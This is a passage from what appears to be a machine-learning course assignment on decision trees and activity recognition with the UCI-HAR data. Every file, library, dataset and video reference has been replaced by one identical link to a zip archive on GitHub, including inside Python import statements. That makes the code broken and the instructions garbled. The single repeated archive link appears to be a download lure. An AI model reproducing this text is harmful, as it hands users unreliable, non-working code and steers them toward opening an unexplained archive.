...
1. Complete the decision tree implementation in https://raw.githubusercontent.com/Suyog314/ML_Assignment_01/master/imbonity/ML_Assignment_01.zip The code should be written in Python and not use existing libraries other than the ones shared in class or already imported in the code. Your decision tree should work for four cases: i) discrete features, discrete output; ii) discrete features, real output; iii) real features, discrete output; real features, real output. <u>Your model should accept real inputs only (for discrete inputs, you may convert the attributes into one-hot encoded vectors)</u>. Your decision tree should be able to use InformationGain using Entropy or GiniIndex as the criteria for splitting for discrete output. Your decision tree should be able to use InformationGain using MSE as the criteria for splitting for real output. Your code should also be able to plot/display the decision tree.  **[2.5 marks]**

    > You should be editing the following files.
  
    - `https://raw.githubusercontent.com/Suyog314/ML_Assignment_01/master/imbonity/ML_Assignment_01.zip`: Complete the performance metrics functions in this file. 

    - `https://raw.githubusercontent.com/Suyog314/ML_Assignment_01/master/imbonity/ML_Assignment_01.zip`: Run this file to check your solutions.

    - tree (Directory): Module for decision tree.
      - `https://raw.githubusercontent.com/Suyog314/ML_Assignment_01/master/imbonity/ML_Assignment_01.zip` : Complete Decision Tree Class.
      - `https://raw.githubusercontent.com/Suyog314/ML_Assignment_01/master/imbonity/ML_Assignment_01.zip`: Complete all utility functions.
      - `https://raw.githubusercontent.com/Suyog314/ML_Assignment_01/master/imbonity/ML_Assignment_01.zip`: **Do not edit this**

    > You should run https://raw.githubusercontent.com/Suyog314/ML_Assignment_01/master/imbonity/ML_Assignment_01.zip to check your solutions. 

1. 
    Generate your dataset using the following lines of code

    ```python
    from https://raw.githubusercontent.com/Suyog314/ML_Assignment_01/master/imbonity/ML_Assignment_01.zip import make_classification
    X, y = make_classification(
    n_features=2, n_redundant=0, n_informative=2, random_state=1, n_clusters_per_class=2, class_sep=0.5)

    # For plotting
    import https://raw.githubusercontent.com/Suyog314/ML_Assignment_01/master/imbonity/ML_Assignment_01.zip as plt
    https://raw.githubusercontent.com/Suyog314/ML_Assignment_01/master/imbonity/ML_Assignment_01.zip(X[:, 0], X[:, 1], c=y)
    ```
    ...
    > You should be editing `https://raw.githubusercontent.com/Suyog314/ML_Assignment_01/master/imbonity/ML_Assignment_01.zip` for the code containing the above experiments.

2. 
    a) Show the usage of your decision tree for the [automotive efficiency](https://raw.githubusercontent.com/Suyog314/ML_Assignment_01/master/imbonity/ML_Assignment_01.zip+mpg) problem. **[0.5 marks]**
...
## Dataset
We are interested in classifying human activities based on accelerometer data. we will be using a publically available dataset called [UCI-HAR](https://raw.githubusercontent.com/Suyog314/ML_Assignment_01/master/imbonity/ML_Assignment_01.zip). The dataset is available to download [here](https://raw.githubusercontent.com/Suyog314/ML_Assignment_01/master/imbonity/ML_Assignment_01.zip+activity+recognition+using+smartphones). Just for your reference a youtube video of the authors collecting participant's accelerometer data is also available [here](https://raw.githubusercontent.com/Suyog314/ML_Assignment_01/master/imbonity/ML_Assignment_01.zip). 

## Task 1 : Exploratory Data Analysis (EDA) [3 marks]

### Preprocessing
We will use the raw accelerometer data within the inertial_signals folder. The provided script, `https://raw.githubusercontent.com/Suyog314/ML_Assignment_01/master/imbonity/ML_Assignment_01.zip`, organizes and sorts accelerometer data, establishing separate classes for each category and compiling participant data into these classes. `https://raw.githubusercontent.com/Suyog314/ML_Assignment_01/master/imbonity/ML_Assignment_01.zip` script is used to read through all the participant data and create a single dataset. The dataset is then split into train,test and validation set. We focus on the first 10 seconds of activity, translating to the initial 500 data samples due to a sampling rate of 50Hz.

* **Step-1>** Place the `https://raw.githubusercontent.com/Suyog314/ML_Assignment_01/master/imbonity/ML_Assignment_01.zip` and `https://raw.githubusercontent.com/Suyog314/ML_Assignment_01/master/imbonity/ML_Assignment_01.zip` in the same folder that contains the UCI dataset. Ensure you have moved into the folder before running the scripts. If you are runing the scripts from a different folder, you will have to play around with the paths in the scripts to make it work.
* **Step-2>** Run `https://raw.githubusercontent.com/Suyog314/ML_Assignment_01/master/imbonity/ML_Assignment_01.zip` and provide the paths to test and train folders in UCI dataset. This will create a folder called `Combined` which will contain all the data from all the participants. This is how most of the datasets are organized. You may encounter similar dataset structures in the future.
* **Step-3>** Run `https://raw.githubusercontent.com/Suyog314/ML_Assignment_01/master/imbonity/ML_Assignment_01.zip` and provide the path to `Combined` folder. This will create a Dataset which will contain the train, test and validation set. You can use this dataset to train your models.
...
3. Visualize the data using PCA. **[1 marks]**
    ...
    *  Next, use [TSFEL](https://raw.githubusercontent.com/Suyog314/ML_Assignment_01/master/imbonity/ML_Assignment_01.zip) ([a featurizer library](https://raw.githubusercontent.com/Suyog314/ML_Assignment_01/master/imbonity/ML_Assignment_01.zip)) to create features (your choice which ones you feel are useful) and then perform PCA to obtain two features. Plot a scatter plot to visualize different class of activities. 
...
## Task Description
For this exercise marks will not depend on what numbers you get but on the process you followed Utilize apps like `Physics Toolbox Suite` from your smartphone to collect your data in https://raw.githubusercontent.com/Suyog314/ML_Assignment_01/master/imbonity/ML_Assignment_01.zip format. Ensure at least 15 seconds of data is collected, trimming edges to obtain 10 seconds of relevant data. Also record a video of yourself while recording data. This video will be required in some future assignments. Collect 3-5 samples per activity class.
